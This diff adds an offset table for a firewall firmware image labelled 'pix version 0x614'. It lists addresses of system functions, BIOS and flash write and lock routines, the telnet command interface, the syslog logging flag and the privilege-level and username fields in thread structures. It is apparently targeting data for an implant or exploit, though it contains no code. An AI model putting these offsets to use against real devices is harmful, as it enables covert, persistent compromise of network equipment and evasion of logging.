@@ -1,0 +1,87 @@
+; --- SECTION I ---
+;
+0x614       /* pix version */
+0x276800    /* config address in an os.bin
+0x0  0x80000E9c   // allocb
+0x1  0x8000103c   // freeb
+0x2  0x8000144c   // open
+0x3  0x800015c0   // put
+0x4  0x800014d8   // close
+0x5  0x8021ae0c   // atoip
+0x6  0x80214d00   // memset
+0x7  0x8021a798   // memcpy
+0x8  0x8021760c   // malloc
+0x9  0x80217af8   // free
+0xa  0x80215a7c   // printf
+0xb  0x80205408   // des_encrypt
+0xc  0x8021b128   // isprint
+0xd  0x80205fb0   // des_set_key
+0xe  0x800A9114   // sha
+0xf  0x8021A2E8   // rand
+0x15 0x80002840   // process_create
+0x16 0x80003284   // process_suspend
+0x17 0x800032ec   // process_sleep_for
+0x18 0x801fba38   // show_process
+0x19 0x80003898   // bark
+0x1a 0x8047fe6c   // cur_t
+0x2a 0x3c        // rptr
+0x2b 0x44        // wptr
+0x2c 0x18        // inIfc
+0x2d 0x50        // iftype
+0x30 0x8048d9e4  // zero_security_level
+0x31 0x8048d9e8  // zero_name
+0x32 0x8048d9c8  // zero_ip
+0x33 0x1cc       // length of interface struct
+0x34 0x804896e0  // num_nics
+0x35 0x8025FCF0  // internal_clock
+0x36 0x80486688  // addr of flash structure
+0x36  0x80486688        // addr of flash structure
+;
+; --- END OF SECTION I ---
+;
+:EOS:
+;
+; --- SECTION II ---
+;
+InterfaceAddr          0x8048d9c8  /* matches entry 0x32 above */
+InterfaceLeng          0x11f8    /* 10 times entry 0x33 above */
+IntSecurityOffset      0x1c
+IntNameOffset          0x20
+MaxInterfaces          0x804896e0      // matches entry 0x34 above
+FlashClassAddr         0x80486688
+CryptoDeviceAddr       0x8025fd10
+ArpTableAddrPtr        0x8024d0bc      // addr of first entry in ARP table
+ArpTableLastPtr        0x8024d0c4      // addr of last entry in ARP table
+NumInterfaces          0x804896e0      // addr of pointer to number of interfaces
+IfaceStruct2           0x804873a0      // addr of pointer to second smaller interface struct
+IfaceStruct2Len        0x44            // length of 2nd smaller interface struct used by arp cache
+BiosClassAddr          0x80486658      // addr of the bios class structure
+BiosWriteAddr1         0x80061734      // addr of the bios write function for one specific bios
+BiosWriteAddr2         0x800652c8      // addr of the bios write function for one specific bios
+BiosWriteAddr3         0x80065904      // addr of the bios write function for one specific bios
+BiosWriteAddr4         0x80067160      // addr of the bios write function for one specific bios
+BiosWriteAddr5         0x800678ec      // addr of the bios write function for one specific bios
+BiosWriteOffset        0x00000020      // offset into the bios structure where write addr is located
+BiosReadE28F6          0x800675c4      // addr of the bios read function for e28f640j3 chip
+BiosLockE28F6          0x80067acc      // addr of the bios block lock/unlock function for e28f640j3 chip
+AnnounceFunc           0x80001404      // addr of the device announce function
+DevIoctlOffset         0x70            // offset to the ioctl function in a device structure
+CIStartFunc            0x80005ae4      // addr of the command interface start function -- telnet function
+CommandListAddr        0x8024dc0c      // addr of the command list -- first parameter of ci
+DeviceListPtrAddr      0x8025fcd4      // pointer to the first entry in the device table -- find in announce
+DeviceNextPtrOffset    0x50            // offset into the device table entry which has pointer to next entry -- find in announce
+StrcmpFuncAddr         0x80218d18      // address of strcmp -- search for 'strcmp'
+*SyslogFlagPtrAddr      0x80326e2c      // pointer to the logging flag. -- search for 'Syslog logging:'
+PGDGETValue            0x85b00001      // This contains a copy of the pager length -- case 0x1 of pager_ioctl
+PGDPUSHValue           0x85b00002      // The value used for PGD_PUSH when calling the pager ioctl
+PGDSETValue            0x85b00000      // The value used for PGD_SET when calling the pager ioctl
+StdChOffset            0x50            // Offset into a thread struct containing the stdch pointer
+StdErrOffset           0x54            // Offset into a thread struct containing the stderr pointer
+PrivFlagOffset         0x0c            // offset into an environment struct containing the privilege level indicator
+UnameOffset            0x14            // offset into an environment struct containing the username 
+EnvPtrOffset           0x58            // offset into a thread struct containing the pointer to the environment struct  
+;
+; ------------------- END OF SECTION II ---------------------------
+;
+:EOS:
+;
